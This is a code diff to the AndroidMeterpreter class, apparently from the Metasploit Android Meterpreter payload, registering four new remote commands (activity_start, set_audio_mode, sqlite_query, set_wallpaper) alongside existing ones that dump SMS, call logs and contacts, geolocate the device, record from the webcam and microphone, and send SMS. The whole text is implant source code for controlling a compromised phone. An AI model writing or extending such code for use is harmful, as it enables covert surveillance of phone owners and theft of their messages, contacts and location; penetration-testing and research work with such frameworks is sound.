@@ -4,6 +4,7 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 
+import com.metasploit.meterpreter.android.activity_start_android;
 import com.metasploit.meterpreter.android.check_root_android;
 import com.metasploit.meterpreter.android.dump_calllog_android;
 import com.metasploit.meterpreter.android.dump_contacts_android;
@@ -11,7 +12,11 @@ import com.metasploit.meterpreter.android.dump_sms_android;
 import com.metasploit.meterpreter.android.geolocate_android;
 import com.metasploit.meterpreter.android.interval_collect;
 import com.metasploit.meterpreter.android.send_sms_android;
+import com.metasploit.meterpreter.android.set_audio_mode_android;
+import com.metasploit.meterpreter.android.set_wallpaper_android;
+import com.metasploit.meterpreter.android.sqlite_query_android;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
+import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
 import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
 import com.metasploit.meterpreter.android.stdapi_sys_process_get_processes_android;
 import com.metasploit.meterpreter.android.webcam_audio_record_android;
@@ -20,9 +25,6 @@ import com.metasploit.meterpreter.android.webcam_list_android;
 import com.metasploit.meterpreter.android.webcam_start_android;
 import com.metasploit.meterpreter.android.webcam_stop_android;
 import com.metasploit.meterpreter.android.wlan_geolocate;
-
-import com.metasploit.meterpreter.IntervalCollectionManager;
-
 import com.metasploit.meterpreter.stdapi.Loader;
 import com.metasploit.meterpreter.stdapi.channel_create_stdapi_fs_file;
 import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_tcp_client;
@@ -42,13 +44,11 @@ import com.metasploit.meterpreter.stdapi.stdapi_fs_stat;
 import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_interfaces_V1_4;
 import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_routes_V1_4;
 import com.metasploit.meterpreter.stdapi.stdapi_net_socket_tcp_shutdown_V1_3;
-import com.metasploit.meterpreter.stdapi.stdapi_sys_config_getuid;
 import com.metasploit.meterpreter.stdapi.stdapi_sys_process_execute_V1_3;
 
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.OutputStream;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 
 public class AndroidMeterpreter extends Meterpreter {
@@ -163,6 +163,10 @@ public class AndroidMeterpreter extends Meterpreter {
             mgr.registerCommand("send_sms", send_sms_android.class);
             mgr.registerCommand("wlan_geolocate", wlan_geolocate.class);
             mgr.registerCommand("interval_collect", interval_collect.class);
+            mgr.registerCommand("activity_start", activity_start_android.class);
+            mgr.registerCommand("set_audio_mode", set_audio_mode_android.class);
+            mgr.registerCommand("sqlite_query", sqlite_query_android.class);
+            mgr.registerCommand("set_wallpaper", set_wallpaper_android.class);
         }
         return getCommandManager().getNewCommands();
     }
